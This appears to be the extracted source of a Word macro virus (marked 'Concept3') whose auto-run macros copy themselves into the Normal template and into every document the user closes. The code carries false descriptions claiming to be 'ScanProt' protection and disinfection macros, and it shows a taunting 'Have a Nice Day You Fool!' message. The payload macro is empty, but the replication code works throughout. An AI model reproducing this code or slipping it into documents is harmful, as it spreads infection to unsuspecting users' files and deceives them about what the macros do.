   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim counter
   Dim vZap$
   Dim vMacro$
       On Error GoTo -1: On Error GoTo Abort
   WordBasic.DisableAutoMacros
               counter = counter + 1

               vZap$ = WordBasic.[FileName$]()

               vMacro$ = vZap$ + ":Payload"
               WordBasic.MacroCopy vMacro$, "Global:PayLoad"

               vMacro$ = vZap$ + ":AutoExit"
               WordBasic.MacroCopy vMacro$, "Global:AutoExit"

               vMacro$ = vZap$ + ":AutoOpen"
               WordBasic.MacroCopy vMacro$, "Global:VOpen"

               vMacro$ = vZap$ + ":VClose"
               WordBasic.MacroCopy vMacro$, "Global:AutoClose"

   Abort:
   counter = counter + 1

   End Sub

   Attribute VB_Name = "AutoExit"

   Rem Concept3.AutoExit.Macro
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "ScanProt macro to protect and disinfect your Normal (Global) template."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExit.MAIN"
   Dim message1$
   Dim daynumber
   Dim monthnumber
   message1$ = "Have a Nice Day You Fool!"

   daynumber = WordBasic.Day(WordBasic.Now())
   monthnumber = WordBasic.Month(WordBasic.Now())

   If daynumber = 1 And monthnumber = 4 Then WordBasic.MsgBox message1$ Else WordBasic.MsgBox message1$

   End Sub

   Attribute VB_Name = "Payload"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Null macro to prevent prank macros from re-installing.  Do not delete."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Payload.MAIN"
       Rem That's enough to prove my point
   End Sub

   Attribute VB_Name = "VClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.VClose.MAIN"
   Dim counter
   Dim vZap$
   Dim vMacro$
       On Error GoTo -1: On Error GoTo Abort
   WordBasic.DisableAutoMacros
               counter = counter + 1
           WordBasic.FileSaveAs Format:=1

           vZap$ = WordBasic.[FileName$]()

           vMacro$ = vZap$ + ":Payload"
           WordBasic.MacroCopy "Global:PayLoad", vMacro$

           vMacro$ = vZap$ + ":AutoExit"
           WordBasic.MacroCopy "Global:AutoExit", vMacro$

           vMacro$ = vZap$ + ":AutoOpen"
           WordBasic.MacroCopy "Global:VOpen", vMacro$

           vMacro$ = vZap$ + ":VClose"
           WordBasic.MacroCopy "Global:AutoClose", vMacro$

           WordBasic.FileSaveAs Format:=1

   Abort:
   End Sub
